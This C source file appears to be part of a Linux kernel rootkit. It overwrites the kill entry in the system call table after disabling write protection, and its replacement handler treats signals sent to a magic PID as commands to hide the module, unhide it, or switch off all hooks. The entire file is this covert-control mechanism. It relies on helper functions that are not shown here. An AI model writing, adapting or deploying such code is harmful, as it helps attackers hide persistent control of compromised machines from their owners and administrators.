#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/signal.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include "syscall_table.h"
#include "hook_defs.h"

asmlinkage long (*original_kill)(pid_t pid, int sig);

asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (pid == MAGIC_TRIGGER_PID) {
        switch (sig) {
            case SIGUSR1:
                hide_module();      
                return 0;
            case SIGUSR2:
                show_module();      
                return 0;
            case SIGKILL:
                disable_all_hooks(); 
                return 0;
            default:
                break;
        }
    }

    return original_kill(pid, sig);
}

void enable_kill_hook(unsigned long **syscall_table)
{
    original_kill = (void *)syscall_table[__NR_kill];
    disable_write_protection();
    syscall_table[__NR_kill] = (unsigned long *)hooked_kill;
    enable_write_protection();
}

void disable_kill_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_kill] = (unsigned long *)original_kill;
    enable_write_protection();
}
